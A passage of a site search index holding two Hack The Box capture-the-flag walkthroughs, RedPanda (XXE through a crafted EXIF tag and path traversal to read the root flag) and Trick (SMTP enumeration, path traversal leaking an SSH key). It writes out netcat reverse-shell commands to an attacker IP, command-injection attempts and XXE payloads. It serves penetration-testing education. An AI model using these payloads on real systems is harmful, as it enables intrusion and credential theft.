public static String getArtist(String uri) throws IOException, JpegProcessingException { String fullpath = &#34;/opt/panda_search/src/main/resources/static&#34; + uri; File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for(Directory dir : metadata.getDirectories()) { for(Tag tag : dir.getTags()) { if(tag.getTagName() == &#34;Artist&#34;) { return tag.getDescription(); } } } return &#34;N/A&#34;; So it opens the file, examines the metadata, looks for the metadata tag &ldquo;Artist&rdquo; and returns the contents of that tag.
What didn&rsquo;t work Maybe it would be possible to jank a new .jpg file, edit the metadata using exiftool, and insert it into /opt/panda_search/src/main/resources/static/myphoto.jpg. At that point, I should at least see my custom entry appear on the /stats page.
After getting that to work, maybe I can sneak some kind of exploit into the Artist tag. For now, I&rsquo;ll try to just insert a custom entry as a proof of concept.
The Main function in App.java shows that a certain xml file will be opened.
... String xmlPath = &#34;/credits/&#34; + artist + &#34;_creds.xml&#34;; addViewTo(xmlPath, parsed_data.get(&#34;uri&#34;).toString()); ... We have xml being parsed and written and accessible from the /stats page. So is this an opportunity for an XXE attack?
Upon inspection of the code, it seems like this is also where the view counts are stored, so the file must be persistent. Let&rsquo;s search for this file:
find / -name &#34;woodenk_creds.xml&#34; 2&gt;/dev/null Oh, its just in /credits/woodenk_creds.xml&hellip; duh 😅
But there&rsquo;s a problem: for an XXE attack you&rsquo;d normally need a document type definition (the DOCTYPE header). The xml files have no such definition:
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;credits&gt; &lt;author&gt;woodenk&lt;/author&gt; &lt;image&gt; &lt;uri&gt;/img/greg.jpg&lt;/uri&gt; &lt;views&gt;4&lt;/views&gt; &lt;/image&gt; &lt;image&gt; &lt;uri&gt;/img/hungy.jpg&lt;/uri&gt; &lt;views&gt;2&lt;/views&gt; &lt;/image&gt; &lt;image&gt; &lt;uri&gt;/img/smooch.jpg&lt;/uri&gt; &lt;views&gt;2&lt;/views&gt; &lt;/image&gt; &lt;image&gt; &lt;uri&gt;/img/smiley.jpg&lt;/uri&gt; &lt;views&gt;3&lt;/views&gt; &lt;/image&gt; &lt;totalviews&gt;11&lt;/totalviews&gt; &lt;/credits&gt; So that leaves us with only one option for XXE, that&rsquo;s to use an XInclude attack.
The program that&rsquo;s doing the xml parsing is running as root, and we know the path of the root flag is /root/root.txt, so we can probably leak the flag (hopefully unnecessary to get a root shell 🙏) if we can find a way to sneak this into the author field:
&lt;foo xmlns:xi=&#34;http://www.w3.org/2001/XInclude&#34;&gt; &lt;xi:include parse=&#34;text&#34; href=&#34;file:///root/root.txt&#34;/&gt;&lt;/foo&gt; Well shoot, it looks like the photos, and the directory they&rsquo;re in, is read only for user woodenk. What now?
New idea Maybe we don&rsquo;t have to use the original directories. Is there a way we could do a directory traversal for the xml file within App.java?
Perhaps we could use a false uri that has a bunch of ../ inside it, to traverse to an xml of our own creation. This looks like it&rsquo;s possible, given the way the uri gets mapped from the redpanda.log file: we can use extra || separators to introduce a false uri. This uri should point to a custom made photo, and that photo should have an author that ALSO does a directory traversal. i.e.
The uri needs to undo the path &ldquo;/opt/panda_search/src/main/resources/static&rdquo; + uri (the base directory is 6 dirs deep), so the concatenated uri should have the following form:
/opt/panda_search/src/main/resources/static/../../../../../../home/woodenk/myphoto.jpg So the desired uri is /../../../../../../home/woodenk/myphoto.jpg
I always have to take a step back and check my work with directory traversals, I test it by doing it on a known folder 2 levels deep. idk why I have a mental blockage about this but I always need to check it&hellip;
ls /home/kali/../../ Which shows the typical dirs /bin /boot /dev /etc /home &hellip;
By examining App.java, it looks like we can insert this false uri by including extra || characters in the user-agent part of any request to redpanda.htb. When the program builds the Map of data from each line of the log file, it simply grabs the fourth element of the line, broken up by ||. There is nothing preventing us from sneaking this into the user-agent field.
The file myphoto.jpg will need to have an artist tag set in the metadata such that LogParser (with source code App.java) unpacks to undo the path &ldquo;/credits/[artistname]_creds.xml&rdquo;:
/credits/../home/woodenk/xxe_creds.xml So the desired artist tag has contents ../home/woodenk/xxe
I downloaded some random jpg of a red panda, and gave it an Artist tag by using exiftool:
exiftool -Artist=../home/woodenk/xxe myphoto.jpg Since we can use the custom uri to point to any xml, we can craft and control the whole xml, thus making it so we can use any XXE attack (not just an XInclude). We have read-access to the original xmls, so I&rsquo;ll copy the damian_creds.xml and use that as a base. This is how my xxe_creds.xml ended up:
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt; &lt;!DOCTYPE credits [ &lt;!ENTITY xxe SYSTEM &#34;file:///root/root.txt&#34;&gt; ]&gt; &lt;credits&gt; &amp;xxe; &lt;/credits&gt; Now, as if that plan wasn&rsquo;t complicated enough, there is the cleanup.sh script to work around. I remembered checking it after I was watching pspy. Here are the contents:
woodenk@redpanda:~$ less /opt/cleanup.sh #!/bin/bash /usr/bin/find /tmp -name &#34;*.xml&#34; -exec rm -rf {} \\; /usr/bin/find /var/tmp -name &#34;*.xml&#34; -exec rm -rf {} \\; /usr/bin/find /dev/shm -name &#34;*.xml&#34; -exec rm -rf {} \\; /usr/bin/find /home/woodenk -name &#34;*.xml&#34; -exec rm -rf {} \\; /usr/bin/find /tmp -name &#34;*.jpg&#34; -exec rm -rf {} \\; /usr/bin/find /var/tmp -name &#34;*.jpg&#34; -exec rm -rf {} \\; /usr/bin/find /dev/shm -name &#34;*.jpg&#34; -exec rm -rf {} \\; /usr/bin/find /home/woodenk -name &#34;*.jpg&#34; -exec rm -rf {} \\; It deletes all the xml and jpg files from the directories we can write to! Gah!
No worries. I&rsquo;ll just put a fake extension (.hide) on the end of the files I need and strip it off right before I perform the attack. I&rsquo;ll change the file extensions with a simple bash rename:
for f in *.hide; do cp $f \${f%.hide}; done The Plan host my custom myphoto.jpg.hide and xxe_creds.xml.hide on a python webserver running on port 8080 download those files to the target machine (into woodenk&rsquo;s home directory) using curl strip off the .hide file extensions, as shown above, then quickly proceed to step 4! make a request to http://redpanda.htb using a modified user-agent in the http header (ending in ||/../../../../../../home/woodenk/myphoto.jpg ), thus inserting the fake uri into redpanda.log. The fake URI points to the custom photo, and the Artist tag within the photo points to the xxe_creds.xml file, which itself contains the xxe attack, which should leak the contents of /root/root.txt. wait for LogParser to run (which will run as root, as seen in pspy) read the contents of xxe_creds.xml to find the root flag Executing the Plan I performed steps 1-3 as described.
For step 4, I used Burp Repeater.
Sidenote: my python webserver hosting the myphoto.jpg.hide and xxe_creds.xml.hide was interfering with my Burp proxy. To use Burp, I had to turn off the python webserver.
For steps 5 and 6, I used watch:
watch cat xxe_creds.xml After waiting about 30s, I saw the root flag appear :happy:
🎉 Yay, a root flag!
LESSONS LEARNED Attacker Use proper escaping of inputs. SSTIs are always avoidable, and with very little extra work. Treat all user inputs as untrusted. Even innocuous things such as fields within exif data can be weaponized. If the image is user input, then the all parameters of the image are also user input - and none should be trusted. Scheduled processes are almost always a privesc vector. Pay very close attention to scheduled processes when attempting privesc. There&rsquo;s a very high likelihood that it will lead to something useful. Defender Minimize the attack surface. This box was running so many languages and service that it must have been difficult for an individual to administrate. Try to keep applications and dependency trees as small as possible. When feasible, use docker instead. Avoid XML parsing. If you don&rsquo;t need all the bells and whistles of XML, switch to a simpler data structure such as JSON. While it has fewer features, it also has fewer vulnerabilities. `,url:"https://4wayhandshake.github.io/walkthrough/redpanda/"},"https://4wayhandshake.github.io/walkthrough/trick/":{title:"Trick",tags:["SMTP","CVE","VHost Enumeration","Directory Traversal","Fail2Ban"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Trick appears to be a website that is under construction. At first glance, there is no functionality, but a little enumeration will reveal much more. Finding a foothold is not too difficult as long as proper enumeration techniques are followed. While this is an &ldquo;Easy&rdquo; box, the path to root takes a lot of creativity and forethought, and a bit of scripting. You&rsquo;re fighting against a system that is trying to protect itself, but there is a way in!
RECON I set RADDR to the target IP address, then began with my typical &ldquo;init&rdquo; scan:
sudo nmap -sV -sC -O -n -Pn -oA nmap/init-scan $RADDR However, this yielded no results at all.
I then proceeded to a ping scan instead:
└─$ sudo nmap -Pn -oA nmap/port-scan $RADDR Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-31 18:32 EDT Nmap scan report for trick.htb (10.10.11.166) Host is up (0.035s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 25/tcp open smtp 53/tcp open domain 80/tcp open http 22 (ssh), 53 (dns), and 80 (http) are expected. SMTP is less common, and may indicate some extra mail-sending functionality.
http Seeing port 80, I added the address to trick.htb in my /etc/hosts file and proceeded with subdomain fuzzing using ffuf:
WLIST=/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt ffuf -w $WLIST:FUZZ -u http://FUZZ.trick.htb/ No result. I&rsquo;ll try vhost fuzzing instead:
ffuf -w $WLIST:FUZZ -u http://trick.htb:80/ -H &#39;Host: FUZZ.trick.htb&#39; Only ran that for a few seconds to note that all responses are of size 5480. Filter these out:
ffuf -w $WLIST:FUZZ -u http://trick.htb:80/ -H &#39;Host: FUZZ.trick.htb&#39; -fs 5480 Still nothing.
Ok, I think it&rsquo;s safe to say we are dealing with a pretty simple http server that has outgoing email.
Next, let&rsquo;s try signing up for their notifications:
It appears to be a Form service that is not connected to anything.
Next, I performed directory enumeration using feroxbuster. This yielded the following directories:
/js /css /assets /assets/img I checked the http server info using a whatweb query:
whatweb http://trick.htb This confirmed that the site uses bootstrap, and gave a specific version of nginx: 1.14.2. This appears to be a legacy version of nginx, succeeded by version 1.16 (changelog here) and several versions by now. The only notable security change that I saw since 1.14.2 was this:
Security: processing of a specially crafted mp4 file with the ngx_http_mp4_module might result in worker process memory disclosure (CVE-2018-16845). DNS I did the steps mentioned at the bottom of the DNS hacktricks page
dig returned a possibly interesting result. Why do they have a CNAME record for preprod-payroll.trick.htb? :
I&rsquo;m not sure what its purpose is. I decided to revisit this later after investigating SMTP.
SMTP I ran the smtp enumeration nmap script
nmap -p25 -oA nmap/smtp --script smtp-commands $RADDR Following the advice of the SMTP hacktricks page, I tried logging into the smtp server using telnet.
telnet $RADDR 25 I did not know what all the smtp status codes were, so I checked the wiki. There was an example shown at the bottom of that wiki article showing how to interact with the server using these codes. Noting that the nmap enumeration showed ENHANCEDSTATUSCODES I referred to the bottom example for sending a message. I also tried checking some users (root, admin, mailto).
💡 If this worked, then perhaps the usernames could be enumerated using this VRFY command..?
└─$ telnet $RADDR 25 Trying 10.10.11.166... Connected to 10.10.11.166. Escape character is &#39;^]&#39;. 220 220 debian.localdomain ESMTP Postfix (Debian/GNU) 502 5.5.2 Error: command not recognized VRFY root 252 2.0.0 root VRFY admin 550 5.1.1 &lt;admin&gt;: Recipient address rejected: User unknown in local recipient table VRFY mailto 550 5.1.1 &lt;mailto&gt;: Recipient address rejected: User unknown in local recipient table MAIL FROM:&lt;gerf&gt; 250 2.1.0 Ok RCPT TO:&lt;fake@fake.com&gt; 454 4.7.1 &lt;fake@fake.com&gt;: Relay access denied DATA 554 5.5.1 Error: no valid recipients RCPT TO:&lt;root&gt; 250 2.1.5 Ok DATA 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; Well hello there This is a test email message . 250 2.0.0 Ok: queued as A182E4099C QUIT 221 2.0.0 Bye Connection closed by foreign host. That&rsquo;s somewhat interesting. It seems like emails can be sent anonymously as long as they are internal. If I can enumerate the users on the box, maybe I can leak some kind of info by sending an email from root to that user?
The following interaction with the smtp server shows that we could also use the RCPT TO: to enumerate users on the box! I tested this by knowing that root exists but tbd_username does not:
└─$ telnet $RADDR 25 1 ⨯ Trying 10.10.11.166... Connected to 10.10.11.166. Escape character is &#39;^]&#39;. 220 debian.localdomain ESMTP Postfix (Debian/GNU) MAIL FROM:&lt;root&gt; 250 2.1.0 Ok RCPT TO:&lt;tbd_username&gt; 550 5.1.1 &lt;tbd_username&gt;: Recipient address rejected: User unknown in local recipient table RCPT TO:&lt;root&gt; 250 2.1.5 Ok DATA 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; Hi root, I&#39;m root. How are you today? . 250 2.0.0 Ok: queued as B7DD84099C QUIT 221 2.0.0 Bye Connection closed by foreign host. To investigate this idea, I checked through metasploit to see if somebody has already tried this method. As it turns out, it already has a module! auxiliary/scanner/smtp/smtp_enum 🎉
use auxiliary/scanner/smtp/smtp_enum show info &lt;------- By default it is using a very short list of probable unix usernames. set RHOSTS 10.10.11.166 run The scan eventually finished, and showed the following users:
Users found: , _apt, avahi, backup, bin, colord, daemon, dnsmasq, games, geoclue, gnats, hplip, irc, list, lp, mail, man, messagebus, mysql, news, nobody, postfix, postmaster, proxy, pulse, rtkit, saned, speech-dispatcher, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, tss, usbmux, uucp, www-data This is kind of a long list, and I&rsquo;m bad at comparing lists visually, so I wrote a script to compare this list of users to my own /etc/passwd file (to filter out the known/expected users on the box). This is compare_users_list.sh:
#!/bin/bash LIST=&#34;_apt, avahi, backup, bin, colord, daemon, dnsmasq, games, geoclue, gnats, hplip, irc, list, lp, mail, man, messagebus, mysql, news, nobody, postfix, postmaster, proxy, pulse, rtkit, saned, speech-dispatcher, sshd, sync, sys, systemd-coredump, systemd-network, systemd-resolve, systemd-timesync, tss, usbmux, uucp, www-data&#34; IFS=&#34;, &#34; for usr in $LIST; do found=$(grep $usr /etc/passwd) if [ &#34;$found&#34; = &#34;&#34; ]; then echo $usr fi done After running this script, the users that weren&rsquo;t present in my own /etc/passwd were:
dnsmasq hplip postfix postmaster dnsmasq, postfix, and postmaster make sense. But what&rsquo;s this hplip?
Googling this username showed that it is the user for &ldquo;HP&rsquo;s Linux Imaging and Printing software (HPLIP)&rdquo;. Ok, it&rsquo;s a driver. Drivers aren&rsquo;t always very secure - maybe this one isn&rsquo;t?
HPLIP Checking searchsploit revealed something juicy. Maybe it&rsquo;ll work:
I looked up the CVE. This definitely might be applicable for this box:
hpssd in Hewlett-Packard Linux Imaging and Printing Project (hplip) 1.x and 2.x before 2.7.10 allows context-dependent attackers to execute arbitrary commands via shell metacharacters in a from address, which is not properly handled when invoking sendmail.
Naturally, HPLIP is not exposed to the internet right now, so running this exploit through metasploit did not work. However, from the CVE description it sounds like maybe this could work by interacting with smtp over telnet instead.
Here is an excerpt from the exploit code linux/remote/16837.rb:
connect #cmd = &#34;nohup &#34; + payload.encoded cmd = payload.encoded username = &#39;root&#39; toaddr = &#39;nosuchuser&#39; # first setalerts print_status(&#34;Sending &#39;setalerts&#39; request with encoded command line...&#34;) msg = &#34;username=#{username}\\n&#34; + &#34;email-alerts=1\\n&#34; + #&#34;email-from-address=\`#{cmd}\`\\n&#34; + &#34;email-from-address=x;#{cmd};\\n&#34; + &#34;email-to-addresses=#{toaddr}\\n&#34; + &#34;msg=setalerts\\n&#34; sock.put(msg) # next, the test email command print_status(&#34;Sending &#39;testemail&#39; request to trigger execution...&#34;) msg = &#34;msg=testemail\\n&#34; sock.put(msg) Ok, so maybe I can telnet to the smtp server, and try sending an email with a malformed FROM address. Specifically, I&rsquo;ll send it from x;nc 10.10.14.4 4444; (after setting up a netcat listener on my attacker machine). If we get a response, it worked.
Hmm, looks like it won&rsquo;t be quite that easy:
MAIL FROM:hplip;nc 10.10.14.4 4444; 501 5.1.7 Bad sender address syntax The original exploit linux/remote/16837.rb looks like it&rsquo;s encoding the payload. I used od to encode mine:
echo -n &#34;nc 10.10.14.4 4444&#34; | od -A n -t x1 | sed &#39;s/ /\\\\x/g&#39; These were the responses to my various attempts:
Connected to 10.10.11.166. Escape character is &#39;^]&#39;. 220 debian.localdomain ESMTP Postfix (Debian/GNU) 500 5.5.2 Error: bad syntax MAIL FROM:root;nc 10.10.14.4 4444;\\n 501 5.1.7 Bad sender address syntax MAIL FROM:root;nc 10.10.14.4 4444; 501 5.1.7 Bad sender address syntax MAIL FROM:root;\\x6e\\x63\\x20\\x31\\x30\\x2e\\x31\\x30\\x2e\\x31\\x34\\x2e\\x34\\x20\\x34\\x34 \\x34\\x34501 5.1.7 Bad sender address syntax MAIL FROM:root;\\x6e\\x63\\x20\\x31\\x30\\x2e\\x31\\x30\\x2e\\x31\\x34\\x2e\\x34\\x20\\x34\\x34;\\n 501 5.1.7 Bad sender address syntax MAIL FROM:root;id; 501 5.1.7 Bad sender address syntax MAIL FROM:root;id;\\n 501 5.1.7 Bad sender address syntax MAIL FROM:&lt;root;id;&gt; 501 5.1.7 Bad sender address syntax MAIL FROM:&lt;root;id;\\n&gt; 501 5.1.7 Bad sender address syntax MAIL FROM:&lt;root;;&gt; 250 2.1.0 Ok QUIT 221 2.0.0 Bye Connection closed by foreign host. None of these variations worked. I might end up revisiting this idea later, but at this point I decided to pursue other leads.
Revisiting preprod-payroll.trick.htb I added preprod-payroll.trick.htb to my /etc/hosts file (as if it had turned up in the original subdomain fuzzing) and tried directory enumeration against it, once again using feroxbuster:
Well THAT looks very promising :happy:
/login page is shown below:
![preprod-payroll directory login page](preprod-payroll%20directory%20login page.png)
I tried common SQLi auth bypass strings in the username field, no result. Also tried common SQLi polyglots in the username field, also no result. Next I tried sqlmap
SQLMap did not produces any significant results. When attempting to check SQLi using POSTs on the login form, I got false positives from many tests. However, these were just the server replying with an error code. Oh well, was worth a shot.
Looking for other easy ways to bypass the login, I perused the login page&rsquo;s source code.
(Also, I opened up Burp and set my scope to preprod-payroll.trick.htb. I&rsquo;m can be somewhat haphazard in my testing, so Burp helps me organize all the requests I fire off)
curl --proxy=&#34;127.0.0.1:8080&#34; preprod-payroll.trick.htb curl --proxy=&#34;127.0.0.1:8080&#34; preprod-payroll.trick.htb/login.php As it turns out, requests to preprod-payroll.trick.htb provide index.php before redirecting to login.php. By default, Burp then generated a site map of the subdomain. By exploring this auto-generated site map, we can see what the application looks like:
Burp also logged several links within index.php:
By sending these pages to Burp Repeater, we can even get their context. Shown below is page=employee:
![employee page rendered through burp](employee page rendered through burp.png)
Viewing the employee page&rsquo;s source revealed some interesting functionality: perhaps we can use it to generate a new user!
&lt;script type=&#34;text/javascript&#34;&gt; $(document).ready(function(){ $(&#39;.edit_employee&#39;).click(function(){ var $id=$(this).attr(&#39;data-id&#39;); uni_modal(&#34;Edit Employee&#34;,&#34;manage_employee.php?id=&#34;+$id) }); $(&#39;.view_employee&#39;).click(function(){ var $id=$(this).attr(&#39;data-id&#39;); uni_modal(&#34;Employee Details&#34;,&#34;view_employee.php?id=&#34;+$id,&#34;mid-large&#34;) }); $(&#39;#new_emp_btn&#39;).click(function(){ uni_modal(&#34;New Employee&#34;,&#34;manage_employee.php&#34;) }) $(&#39;.remove_employee&#39;).click(function(){ _conf(&#34;Are you sure to delete this employee?&#34;,&#34;remove_employee&#34;,[$(this).attr(&#39;data-id&#39;)]) }) }); function remove_employee(id){ start_load() $.ajax({ url:&#39;ajax.php?action=delete_employee&#39;, method:&#34;POST&#34;, data:{id:id}, error:err=&gt;console.log(err), success:function(resp){ if(resp == 1){ alert_toast(&#34;Employee&#39;s data successfully deleted&#34;,&#34;success&#34;); setTimeout(function(){ location.reload(); },1000) } } }) } &lt;/script&gt; Changing back to my browser, I tried requesting manage_employee.php (connected to #new_emp_btn). It corresponds to the page we just saw the source code for. The form seemed straightforward, but the Position field had all options disabled. Thankfully, this was just a matter of changing the DOM from within the browser, removing the disabled property on each :
![test employee](test employee.png)
Oddly enough, the form is also missing its submit() function. This is what it should be:
$(&#39;#employee_frm&#39;).submit(function(e){ e.preventDefault() start_load(); $.ajax({ url:&#39;ajax.php?action=save_employee&#39;, method:&#34;POST&#34;, data:$(this).serialize(), error:err=&gt;console.log(), success:function(resp){ if(resp == 1){ alert_toast(&#34;Employee&#39;s data successfully saved&#34;,&#34;success&#34;); setTimeout(function(){ location.reload(); },1000) } } }) }) I manually created a POST request in Burp Repeater for this and submitted it. This is the result:
![add user error](add user error.png)
Ok&hellip; Not the result I was looking for, but at least now we know more about the directory structure.
💡 But it does remind me of something important&hellip; you can&rsquo;t have a company without more than just payroll. I realized that I forgot to refine my VHost fuzzing after finding the suspicious preprod-payroll.trick.htb from DNS enumeration.
Taking another crack at VHost fuzzing using the known pattern of preprod-XXX.trick.htb:
WLIST=/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt ffuf -w $WLIST:FUZZ -u http://trick.htb -H &#39;Host: preprod-FUZZ.trick.htb&#39; -t 100 -fs 5480 ![vhost fuzzing again](vhost fuzzing again.png)
🤦‍♂ Of course! why didn&rsquo;t I think of checking that earlier.
I try not to beat myself up over doing things in the wrong order, but it can sure be frustrating to realize I neglected something staring right at me!
The thing to remember here is to take good notes, and when you get stuck read them back to yourself.
Often on an &lsquo;Easy&rsquo; HTB box, if you get stuck after finding something that looks like a good result, it means you may have missed a hint in an earlier step. Critical thinking about your own process can be very valuable.
I added preprod-marketing.trick.htb to my /etc/hosts file and to my Burp scope.
FOOTHOLD preprod-marketing.trick.htb At first glance, the site seems pretty much static. There is a contact page. This is the result of my directory enumeration:
feroxbuster --url http://preprod-marketing.trick.htb -x php ![marketing feroxbuster](marketing feroxbuster.png)
After navigating around the site for a bit, I noticed a big hint: the URI of each page, ex.
http://preprod-marketing.trick.htb/index.php?page=home.html This looked like a candidate for directory traversal. Already knowing (from the errors showing /var/www/payroll/admin_class.php) that this was probably being read from a directory like /var/www/marketing/index.php, I tried using directory traversal tricks going (at least) three directories up:
http://preprod-marketing.trick.htb/index.php?page=../../../../../../etc/passwd http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././etc/passwd And that did it! The second attempt was enough to leak /etc/passwd:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:112:121::/var/lib/saned:/usr/sbin/nologin colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false sshd:x:118:65534::/run/sshd:/usr/sbin/nologin postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash Well hello there, michael 👋 Are you the target?
As it turns out, michael is definitely the target. Or at least, they have the flag:
http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././..././home/michael/user.txt Wonderful!
If I can access michael&rsquo;s home directory (and ssh is open) there&rsquo;s a good chance I can also access michael&rsquo;s ssh key. Taking a guess at the typical location of the ssh key worked perfectly:
http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa Hooray 🎉 That worked! Only the formatting of the ssh key is not idea. I&rsquo;ll use curl to dump it into a file directly, instead:
curl http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././home/michael/.ssh/id_rsa -o id_rsa Now, set proper file permissions on the key (ssh will complain / remind you if you don&rsquo;t), and log in via ssh:
chmod 600 id_rsa ssh michael@trick.htb -i id_rsa ![logged in as michael](logged in as michael.png)
USER FLAG User: michael To make privilege escalation easier, I decided to serve my &ldquo;small toolbox&rdquo; over to the target machine. To do this, I hosted a python http.server with the following tools
www ├── chisel ├── index.html ├── LinEnum.sh ├── linpeas.sh └── pspy sudo ufw allow from 10.10.11.166 to any port 8000 proto tcp cd www python3 -m http.server 8000 Noting down my IP address with ifconfig tun0, I downloaded my toolbox from my http server as michael:
mkdir /tmp/tools curl -O 10.10.14.5:8000/pspy curl -O 10.10.14.5:8000/LinEnum.sh curl -O 10.10.14.5:8000/linpeas.sh chmod u+x ./* I then took a look at michael&rsquo;s $PATH and cross referenced against locations they can write to:
id echo $PATH find / -user michael 2&gt;/dev/null | grep -v proc find / -group security 2&gt;/dev/null | grep -v proc linpeas Next, I ran linpeas.sh to see if there were any easy PE vectors. Some notes on what linpeas showed:
sudo version 1.8.27 Possibly vulnerable to a sudo vulnerability mentioned here in Hacktricks Checked it; nope not vulnerable Possibly vulnerable to another sudo vulnerability described here. Downloaded a git repo with PoC code to my attacker box, compiled the code, transferred it using http.server (this time using wget -r )from my attacker machine to the target machine Ran the code; nope not vulnerable michael has /var/mail. Maybe it&rsquo;s time to reattempt the smtp exploit root is running postfix. Maybe another reason to check out the smtp exploit system is using anacron instead of cron listening on MySQL on tcp port 3306 and IPP (Internet Printing Protocol) on tcp port 631 michael can sudo /etc/init.d/fail2ban restart /usr/bin/gettext.sh is in the PATH Might be a good idea to check /var/www/payroll/database/payroll.sql for credential reuse Also check out /var/www/payroll/admin_class.php and /var/www/payroll/login.php pspy The following shows the output of pspy after running for a few minutes:
ROOT FLAG Fail2Ban Perhaps there is a way to use fail2ban to escalate? pspy showed that /root/fail2ban is being backed-up to /etc, so I can at least take a look at what&rsquo;s inside. Also since michael is in the security group, it&rsquo;s worth checking out /etc/fail2ban/action.d
Fail2Ban appears to have had a pretty severe CVE leading to code execution: CVE-2021-32749. However, this git repo shows that mail is used, and mail is not present on this box. Neither is the leading alternative sendmail&hellip; neither are the less-common alternatives mutt nor ssmtp.
💡But wait, maybe that telnet trick that I used earlier would be enough to exploit CVE-2021-32749 ?
First, I set up a nc listener and checked if a netcat reverse shell would even work on this box (sometimes they don&rsquo;t have the -e flag):
On attacker:
nc -lvnp 4444 On target:
nc 10.10.14.5 4444 -e /bin/sh ![nc test](nc test.png)
Yep, that&rsquo;s successful. Now let&rsquo;s see if we can get root using the same trick? We already know root is running postfix, so perhaps we can use this CVE to get a root reverse shell.
┌──(kali㉿kali)-[~] └─$ telnet $RADDR 25 1 ⨯ Trying 10.10.11.166... Connected to 10.10.11.166. Escape character is &#39;^]&#39;. 220 debian.localdomain ESMTP Postfix (Debian/GNU) MAIL FROM: root 250 2.1.0 Ok RCPT TO: michael 250 2.1.5 Ok DATA 354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt; Michael, I&#39;m sending you an email\\n~! nc 10.10.14.5 4444 -e /bin/sh . 250 2.0.0 Ok: queued as B36C741221 QUIT 221 2.0.0 Bye Connection closed by foreign host. To check if the email was delivered, I used mailq. Indeed it was delivered, but no reverse shell appeared&hellip;
Ok, that&rsquo;s too bad, but I still think fail2ban is a solid lead. We already saw that the /etc/fail2ban/action.d directory is writable by michael. So maybe it is possible to create a new fail2ban action that will acquire us the root shell.
At this point, I had to go research how fail2ban is used and configured. For this, I found the following resources useful:
https://linuxhandbook.com/fail2ban-basic/ https://webcp.io/custom-fail2ban-action/ It looks like /etc/fail2ban/jail.conf would have to be modified to be able to use a custom action. I think modifying an existing action is probably the best option. However, it looks like there aren&rsquo;t any jails enabled:
grep -B 20 -A 10 &#34;enabled = true&#34; jail.conf But then again, within jail.d there is a single entry enabling an sshd jail. Maybe it is as simple as making a new custom jail sshd.conf containing my reverse shell?
This is the entry in jail.conf for sshd:
# # SSH servers # [sshd] # To use more aggressive sshd modes set filter parameter &#34;mode&#34; in jail.local: # normal (default), ddos, extra or aggressive (combines all). # See &#34;tests/files/logs/sshd&#34; or &#34;filter.d/sshd.conf&#34; for usage example and details. #mode = normal port = ssh logpath = %(sshd_log)s backend = %(sshd_backend)s bantime = 10s But further down is where it references what the default action to be taken is:
